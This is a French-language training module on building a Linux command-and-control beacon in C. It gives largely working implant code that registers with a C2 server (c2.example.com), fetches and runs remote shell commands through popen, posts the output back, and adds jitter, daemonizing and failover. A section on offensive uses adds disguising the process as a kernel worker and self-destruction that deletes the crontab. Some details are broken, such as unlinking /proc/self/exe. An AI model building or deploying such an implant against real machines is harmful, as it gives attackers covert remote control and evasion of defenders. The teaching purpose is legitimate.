# Module L25 : Beacon Linux - Architecture Agent C2

## Objectifs

A la fin de ce module, tu vas maîtriser :
- L'architecture complète d'un beacon
- L'implémentation d'une boucle check-in
- La gestion des commandes et résultats
- Les techniques de jitter et sleep
- La gestion multi-threading d'un agent

## 1. Architecture Beacon

### 1.1 Composants d'un Beacon

```ascii
┌──────────────────────────────────────────────────┐
│  ARCHITECTURE BEACON                             │
├──────────────────────────────────────────────────┤
│                                                  │
│  ┌────────────────────────────────────────┐     │
│  │  BEACON CORE                           │     │
│  │  ════════════                          │     │
│  │                                        │     │
│  │  ┌──────────────────┐                 │     │
│  │  │ Configuration    │                 │     │
│  │  │ • C2 URL         │                 │     │
│  │  │ • Beacon ID      │                 │     │
│  │  │ • Sleep time     │                 │     │
│  │  │ • Jitter         │                 │     │
│  │  └──────────────────┘                 │     │
│  │          ↓                            │     │
│  │  ┌──────────────────┐                 │     │
│  │  │  Main Loop       │                 │     │
│  │  │  1. Check-in     │←───┐           │     │
│  │  │  2. Get tasks    │    │           │     │
│  │  │  3. Execute      │    │           │     │
│  │  │  4. Report       │    │           │     │
│  │  │  5. Sleep        │────┘           │     │
│  │  └──────────────────┘                 │     │
│  │          ↓                            │     │
│  │  ┌──────────────────┐                 │     │
│  │  │ Task Manager     │                 │     │
│  │  │ • Queue          │                 │     │
│  │  │ • Dispatcher     │                 │     │
│  │  │ • Executor       │                 │     │
│  │  └──────────────────┘                 │     │
│  │          ↓                            │     │
│  │  ┌──────────────────┐                 │     │
│  │  │ Communication    │                 │     │
│  │  │ • HTTP/HTTPS     │                 │     │
│  │  │ • DNS            │                 │     │
│  │  │ • Custom proto   │                 │     │
│  │  └──────────────────┘                 │     │
│  │                                        │     │
│  └────────────────────────────────────────┘     │
│                                                  │
└──────────────────────────────────────────────────┘
```

### 1.2 Cycle de vie du Beacon

```ascii
┌──────────────────────────────────────────────────┐
│  LIFECYCLE BEACON                                │
├──────────────────────────────────────────────────┤
│                                                  │
│  START                                           │
│    ↓                                             │
│  ┌─────────────┐                                 │
│  │ Initialize  │                                 │
│  │ • Load conf │                                 │
│  │ • Gen ID    │                                 │
│  │ • Daemonize │                                 │
│  └─────────────┘                                 │
│    ↓                                             │
│  ┌─────────────┐                                 │
│  │ First       │                                 │
│  │ Check-in    │ → Register beacon au C2         │
│  └─────────────┘                                 │
│    ↓                                             │
│  ┌───────────────────────────────┐              │
│  │  MAIN LOOP                    │              │
│  │                               │              │
│  │  ┌──────────┐                 │              │
│  │  │ Sleep +  │                 │              │
│  │  │ Jitter   │                 │              │
│  │  └──────────┘                 │              │
│  │       ↓                       │              │
│  │  ┌──────────┐                 │              │
│  │  │ Get      │                 │              │
│  │  │ Tasks    │ ← HTTP GET      │              │
│  │  └──────────┘                 │              │
│  │       ↓                       │              │
│  │  ┌──────────┐                 │              │
│  │  │ Task?    │──No──┐          │              │
│  │  └──────────┘      │          │              │
│  │       │Yes         │          │              │
│  │       ↓            │          │              │
│  │  ┌──────────┐      │          │              │
│  │  │ Execute  │      │          │              │
│  │  │ Command  │      │          │              │
│  │  └──────────┘      │          │              │
│  │       ↓            │          │              │
│  │  ┌──────────┐      │          │              │
│  │  │ Send     │      │          │              │
│  │  │ Results  │ ← HTTP POST     │              │
│  │  └──────────┘      │          │              │
│  │       │            │          │              │
│  │       └────────────┘          │              │
│  │            ↓                  │              │
│  └────────────┘                  │              │
│       (loop continues)           │              │
│                                                  │
└──────────────────────────────────────────────────┘
```

## 2. Implémentation Beacon Complet

### 2.1 Structure et Configuration

```c
// beacon.h
#ifndef BEACON_H
#define BEACON_H

#include <stdint.h>
#include <pthread.h>

#define MAX_TASKS 10
#define MAX_OUTPUT 8192
#define BEACON_ID_LEN 32

// Configuration beacon
typedef struct {
    char c2_url[256];
    char beacon_id[BEACON_ID_LEN];
    uint32_t sleep_time;      // Secondes
    uint32_t jitter;          // Pourcentage (0-100)
    int running;
    pthread_mutex_t lock;
} BeaconConfig;

// Task à exécuter
typedef struct {
    char id[64];
    char command[512];
    char args[1024];
    int completed;
    char output[MAX_OUTPUT];
} Task;

// Queue de tasks
typedef struct {
    Task tasks[MAX_TASKS];
    int count;
    pthread_mutex_t lock;
} TaskQueue;

// Fonctions principales
int beacon_init(BeaconConfig *config);
void beacon_main_loop(BeaconConfig *config);
int beacon_checkin(BeaconConfig *config);
int beacon_get_tasks(BeaconConfig *config, TaskQueue *queue);
int beacon_execute_task(Task *task);
int beacon_send_results(BeaconConfig *config, Task *task);
void beacon_sleep(BeaconConfig *config);

#endif
```

### 2.2 Initialisation et Configuration

```c
// beacon.c
#include "beacon.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>

// Générer un Beacon ID unique
void generate_beacon_id(char *id) {
    char hostname[256];
    gethostname(hostname, sizeof(hostname));

    time_t t = time(NULL);
    pid_t pid = getpid();

    snprintf(id, BEACON_ID_LEN, "%s-%ld-%d", hostname, t, pid);
}

// Initialiser beacon
int beacon_init(BeaconConfig *config) {
    // Générer ID
    generate_beacon_id(config->beacon_id);

    // Init mutex
    pthread_mutex_init(&config->lock, NULL);

    config->running = 1;

    printf("[*] Beacon initialized: %s\n", config->beacon_id);

    return 0;
}

// Daemonize le beacon
int beacon_daemonize() {
    pid_t pid;

    // Fork
    pid = fork();
    if (pid < 0) {
        return -1;
    }

    // Parent exit
    if (pid > 0) {
        exit(0);
    }

    // Devenir leader de session
    if (setsid() < 0) {
        return -1;
    }

    // Fork again
    pid = fork();
    if (pid < 0) {
        return -1;
    }

    if (pid > 0) {
        exit(0);
    }

    // Changer directory
    chdir("/");

    // Fermer file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    // Rediriger vers /dev/null
    open("/dev/null", O_RDONLY);  // stdin
    open("/dev/null", O_WRONLY);  // stdout
    open("/dev/null", O_WRONLY);  // stderr

    return 0;
}
```

### 2.3 Communication avec C2

```c
// beacon_comms.c
#include "beacon.h"
#include <curl/curl.h>
#include <json-c/json.h>

// Check-in initial
int beacon_checkin(BeaconConfig *config) {
    CURL *curl;
    CURLcode res;
    char url[512];
    char json[1024];

    snprintf(url, sizeof(url), "%s/api/checkin", config->c2_url);

    // Créer JSON check-in
    struct json_object *jobj = json_object_new_object();
    json_object_object_add(jobj, "beacon_id",
                          json_object_new_string(config->beacon_id));
    json_object_object_add(jobj, "hostname",
                          json_object_new_string(getenv("HOSTNAME")));
    json_object_object_add(jobj, "user",
                          json_object_new_string(getenv("USER")));

    const char *json_str = json_object_to_json_string(jobj);

    curl = curl_easy_init();
    if (!curl) return -1;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_str);

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    res = curl_easy_perform(curl);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    json_object_put(jobj);

    return (res == CURLE_OK) ? 0 : -1;
}

// Récupérer tasks du C2
int beacon_get_tasks(BeaconConfig *config, TaskQueue *queue) {
    CURL *curl;
    CURLcode res;
    char url[512];
    MemoryStruct chunk = {0};

    snprintf(url, sizeof(url), "%s/api/tasks?id=%s",
             config->c2_url, config->beacon_id);

    curl = curl_easy_init();
    if (!curl) return -1;

    chunk.data = malloc(1);
    chunk.size = 0;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
    curl_easy_setopt(curl, CURLOPT_WRITEDATA, &chunk);

    res = curl_easy_perform(curl);

    if (res == CURLE_OK && chunk.size > 0) {
        // Parser JSON response
        struct json_object *jobj = json_tokener_parse(chunk.data);
        struct json_object *jtasks;

        if (json_object_object_get_ex(jobj, "tasks", &jtasks)) {
            int n_tasks = json_object_array_length(jtasks);

            pthread_mutex_lock(&queue->lock);

            for (int i = 0; i < n_tasks && queue->count < MAX_TASKS; i++) {
                struct json_object *jtask = json_object_array_get_idx(jtasks, i);
                struct json_object *jid, *jcmd, *jargs;

                json_object_object_get_ex(jtask, "id", &jid);
                json_object_object_get_ex(jtask, "command", &jcmd);
                json_object_object_get_ex(jtask, "args", &jargs);

                Task *task = &queue->tasks[queue->count++];
                strncpy(task->id, json_object_get_string(jid), 63);
                strncpy(task->command, json_object_get_string(jcmd), 511);
                if (jargs) {
                    strncpy(task->args, json_object_get_string(jargs), 1023);
                }
                task->completed = 0;
            }

            pthread_mutex_unlock(&queue->lock);
        }

        json_object_put(jobj);
    }

    free(chunk.data);
    curl_easy_cleanup(curl);

    return (res == CURLE_OK) ? 0 : -1;
}

// Envoyer résultats
int beacon_send_results(BeaconConfig *config, Task *task) {
    CURL *curl;
    CURLcode res;
    char url[512];

    snprintf(url, sizeof(url), "%s/api/results", config->c2_url);

    struct json_object *jobj = json_object_new_object();
    json_object_object_add(jobj, "beacon_id",
                          json_object_new_string(config->beacon_id));
    json_object_object_add(jobj, "task_id",
                          json_object_new_string(task->id));
    json_object_object_add(jobj, "output",
                          json_object_new_string(task->output));

    const char *json_str = json_object_to_json_string(jobj);

    curl = curl_easy_init();
    if (!curl) return -1;

    curl_easy_setopt(curl, CURLOPT_URL, url);
    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_str);

    struct curl_slist *headers = NULL;
    headers = curl_slist_append(headers, "Content-Type: application/json");
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

    res = curl_easy_perform(curl);

    curl_slist_free_all(headers);
    curl_easy_cleanup(curl);
    json_object_put(jobj);

    return (res == CURLE_OK) ? 0 : -1;
}
```

### 2.4 Exécution des Commandes

```c
// beacon_executor.c
#include "beacon.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Exécuter commande shell
int execute_shell_command(const char *cmd, char *output, size_t output_size) {
    FILE *fp = popen(cmd, "r");
    if (!fp) return -1;

    size_t n = 0;
    char buffer[1024];

    while (fgets(buffer, sizeof(buffer), fp) && n < output_size - 1) {
        size_t len = strlen(buffer);
        if (n + len < output_size) {
            strcat(output, buffer);
            n += len;
        }
    }

    pclose(fp);
    return 0;
}

// Dispatcher de commandes
int beacon_execute_task(Task *task) {
    if (strcmp(task->command, "shell") == 0) {
        return execute_shell_command(task->args, task->output, MAX_OUTPUT);
    }
    else if (strcmp(task->command, "download") == 0) {
        // Lire fichier et mettre dans output (base64)
        // TODO: implémenter
        return 0;
    }
    else if (strcmp(task->command, "upload") == 0) {
        // Écrire fichier depuis args (base64)
        // TODO: implémenter
        return 0;
    }
    else if (strcmp(task->command, "sleep") == 0) {
        // Changer sleep time
        // TODO: implémenter
        return 0;
    }
    else {
        strcpy(task->output, "Unknown command");
        return -1;
    }
}
```

### 2.5 Jitter et Sleep

```c
// beacon_sleep.c
#include "beacon.h"
#include <stdlib.h>
#include <unistd.h>
#include <time.h>

// Sleep avec jitter
void beacon_sleep(BeaconConfig *config) {
    uint32_t sleep_time = config->sleep_time;

    // Appliquer jitter (variation aléatoire)
    if (config->jitter > 0) {
        srand(time(NULL));
        int jitter_amount = (sleep_time * config->jitter) / 100;
        int variation = (rand() % (2 * jitter_amount)) - jitter_amount;
        sleep_time += variation;
    }

    // Assurer minimum 1 seconde
    if (sleep_time < 1) sleep_time = 1;

    sleep(sleep_time);
}
```

### 2.6 Main Loop

```c
// beacon_main.c
#include "beacon.h"
#include <stdio.h>
#include <signal.h>

volatile int keep_running = 1;

void sighandler(int sig) {
    keep_running = 0;
}

void beacon_main_loop(BeaconConfig *config) {
    TaskQueue queue = {0};
    pthread_mutex_init(&queue.lock, NULL);

    // Check-in initial
    beacon_checkin(config);

    // Main loop
    while (keep_running && config->running) {
        // Sleep avec jitter
        beacon_sleep(config);

        // Get tasks
        if (beacon_get_tasks(config, &queue) == 0) {
            pthread_mutex_lock(&queue.lock);

            // Exécuter toutes les tasks
            for (int i = 0; i < queue.count; i++) {
                Task *task = &queue.tasks[i];

                if (!task->completed) {
                    // Exécuter
                    beacon_execute_task(task);

                    // Envoyer résultats
                    beacon_send_results(config, task);

                    task->completed = 1;
                }
            }

            // Clear queue
            queue.count = 0;

            pthread_mutex_unlock(&queue.lock);
        }
    }

    pthread_mutex_destroy(&queue.lock);
}

int main(int argc, char *argv[]) {
    BeaconConfig config = {
        .c2_url = "https://c2.example.com",
        .sleep_time = 60,
        .jitter = 20
    };

    signal(SIGTERM, sighandler);
    signal(SIGINT, sighandler);

    // Init
    beacon_init(&config);

    // Daemonize (optionnel)
    // beacon_daemonize();

    // Main loop
    beacon_main_loop(&config);

    return 0;
}
```

**Compilation** :
```bash
gcc -o beacon beacon.c beacon_comms.c beacon_executor.c beacon_sleep.c beacon_main.c \
    -lcurl -ljson-c -lpthread
```

## 3. Fonctionnalités Avancées

### 3.1 Heartbeat et Keep-Alive

```c
// Envoyer heartbeat périodique pour indiquer que beacon est actif
void *heartbeat_thread(void *arg) {
    BeaconConfig *config = (BeaconConfig *)arg;

    while (config->running) {
        // Envoyer heartbeat simple
        CURL *curl = curl_easy_init();
        char url[512];
        snprintf(url, sizeof(url), "%s/api/heartbeat?id=%s",
                 config->c2_url, config->beacon_id);

        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_perform(curl);
        curl_easy_cleanup(curl);

        sleep(300);  // Heartbeat toutes les 5 minutes
    }

    return NULL;
}
```

### 3.2 Failover C2

```c
// Plusieurs C2 de backup
typedef struct {
    char *c2_urls[5];
    int current_c2;
    int num_c2;
} C2Failover;

int try_next_c2(C2Failover *failover, BeaconConfig *config) {
    failover->current_c2 = (failover->current_c2 + 1) % failover->num_c2;
    strncpy(config->c2_url, failover->c2_urls[failover->current_c2], 255);
    return beacon_checkin(config);
}
```

## 4. Applications Offensives

### 4.1 Beacon Furtif

```c
// Techniques pour rendre beacon furtif:

// 1. Process name spoofing
int main(int argc, char *argv[]) {
    // Changer nom du processus
    strcpy(argv[0], "[kworker/0:1]");
    prctl(PR_SET_NAME, "[kworker/0:1]", 0, 0, 0);

    // Suite normale...
}

// 2. Sleep aléatoire long
config.sleep_time = 600 + (rand() % 1200);  // 10-30 minutes
config.jitter = 50;  // 50% jitter

// 3. Limiter activité réseau
// Utiliser DNS tunneling au lieu de HTTP
// Petits payloads
```

### 4.2 Auto-destruction

```c
// Auto-destruct après X jours ou si détection
void beacon_self_destruct() {
    // Supprimer binaire
    unlink("/proc/self/exe");

    // Supprimer persistence
    system("crontab -r");

    // Exit
    exit(0);
}

// Dans main loop:
time_t install_time = time(NULL);
if (time(NULL) - install_time > (30 * 24 * 3600)) {
    beacon_self_destruct();
}
```

## Checklist

- [ ] Je comprends l'architecture d'un beacon
- [ ] Je sais implémenter une boucle check-in
- [ ] Je maîtrise la gestion des tasks
- [ ] Je peux exécuter des commandes et récupérer output
- [ ] Je sais implémenter jitter et sleep
- [ ] Je comprends le multi-threading dans un beacon
- [ ] Je connais les techniques de furtivité
- [ ] Je peux implémenter failover C2

## Exercices

Voir [exercice.md](exercice.md)
